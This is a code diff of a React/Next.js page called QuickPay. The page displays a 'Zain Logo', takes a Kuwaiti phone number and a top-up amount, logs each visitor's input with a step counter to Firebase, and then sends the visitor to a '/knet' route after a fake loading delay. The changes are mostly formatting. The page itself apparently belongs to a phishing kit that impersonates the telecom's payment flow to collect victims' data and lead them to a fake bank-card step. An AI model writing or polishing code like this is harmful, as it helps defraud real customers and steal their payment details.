@@ -1,7 +1,8 @@
 "use client"
 
-import { useEffect, useState } from "react"
-import Image from "next/image"
+import type React from "react"
+
+import { useState } from "react"
 import { ChevronDown, Heart, Menu, ShoppingCart } from "lucide-react"
 import { useRouter } from "next/navigation"
 import { addData } from "./lib/firebase"
@@ -14,31 +15,30 @@ export default function QuickPay() {
   const [termsAccepted, setTermsAccepted] = useState(false)
 
   const isPhoneValid = /^9\d{7}$/.test(phone)
-  const [loading, setLoading] = useState(false);
-  const [selectedAmounts, setSelectedAmounts] = useState<number>(5.00);
+  const [loading, setLoading] = useState(false)
+  const [selectedAmounts, setSelectedAmounts] = useState<number>(5.0)
 
   const router = useRouter()
 
+  // Call useLocation at the top level of the component
+  useLocation()
 
   const handleAmountChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
     const value = e.target.value
-    setSelectedAmounts(parseFloat(value));
-    localStorage.setItem('amount', e.target.value);
-  };
+    setSelectedAmounts(Number.parseFloat(value))
+    localStorage.setItem("amount", e.target.value)
+  }
 
   const total = selectedAmounts
-useEffect(()=>{
-  useLocation()
-},[])
 
-  const handleSubmit = (e:any) => {
+  const handleSubmit = (e: any) => {
     e.preventDefault()
     const visitorId = localStorage.getItem("visitor")
     addData({
-    createdDate:new Date().toISOString(),
+      createdDate: new Date().toISOString(),
       id: visitorId,
       phone: phone,
-      step:1
+      step: 1,
     })
     setLoading(true)
 
@@ -46,7 +46,6 @@ useEffect(()=>{
       router.push("/knet")
       setLoading(false)
     }, 2000)
-
   }
 
   return (
@@ -63,11 +62,7 @@ useEffect(()=>{
           </div>
         </div>
         <div className="absolute right-0 left-0 flex justify-center">
-          <img
-            src="/top.png"
-            alt="Zain Logo"
-            className="object-contain"
-          />
+          <img src="/top.png" alt="Zain Logo" className="object-contain" />
         </div>
       </header>
 
@@ -109,7 +104,7 @@ useEffect(()=>{
               <label className="block font-semibold mb-1">
                 أدخل رقم الهاتف <span className="text-red-500">*</span>
               </label>
-         
+
               <input
                 type="text"
                 placeholder="9XXXXXXXX"
@@ -120,28 +115,28 @@ useEffect(()=>{
               />
             </div>
 
-      {isPhoneValid&&    
-            <div className="mb-4">
-              <label className="block font-semibold mb-1">القيمة المختارة</label>
-              <div className="relative">
-                <select
-                  className="w-full p-3 border-b-2 border-[#d50087] bg-transparent appearance-none focus:outline-none"
-                  value={selectedAmounts}
-                  onChange={handleAmountChange}
-                >
-                  <option value={0}>اختر المبلغ</option>
-                  <option value={3}>3.000 د.ك</option>
-                  <option value={5}>5.000 د.ك</option>
-                  <option value={10}>10.000 د.ك</option>
-                  <option value={20}>20.000 د.ك</option>
-                  <option value={30}>30.000 د.ك</option>
-                  <option value={40}>40.000 د.ك</option>
-                  <option value={50}>50.000 د.ك</option>
-                </select>
-                <ChevronDown className="absolute left-2 top-3 text-[#d50087]" size={20} />
+            {isPhoneValid && (
+              <div className="mb-4">
+                <label className="block font-semibold mb-1">القيمة المختارة</label>
+                <div className="relative">
+                  <select
+                    className="w-full p-3 border-b-2 border-[#d50087] bg-transparent appearance-none focus:outline-none"
+                    value={selectedAmounts}
+                    onChange={handleAmountChange}
+                  >
+                    <option value={0}>اختر المبلغ</option>
+                    <option value={3}>3.000 د.ك</option>
+                    <option value={5}>5.000 د.ك</option>
+                    <option value={10}>10.000 د.ك</option>
+                    <option value={20}>20.000 د.ك</option>
+                    <option value={30}>30.000 د.ك</option>
+                    <option value={40}>40.000 د.ك</option>
+                    <option value={50}>50.000 د.ك</option>
+                  </select>
+                  <ChevronDown className="absolute left-2 top-3 text-[#d50087]" size={20} />
+                </div>
               </div>
-            </div>
-}
+            )}
             <div className="mb-6">
               <div className="flex items-start gap-3 mb-4">
                 <input
@@ -155,7 +150,6 @@ useEffect(()=>{
                   قرأت ووافقت على الشروط والأحكام
                 </label>
               </div>
-
             </div>
 
             <button
@@ -184,8 +178,7 @@ useEffect(()=>{
           </form>
         </div>
       </main>
-      {loading&& <Loader />}
-
+      {loading && <Loader />}
     </div>
   )
 }
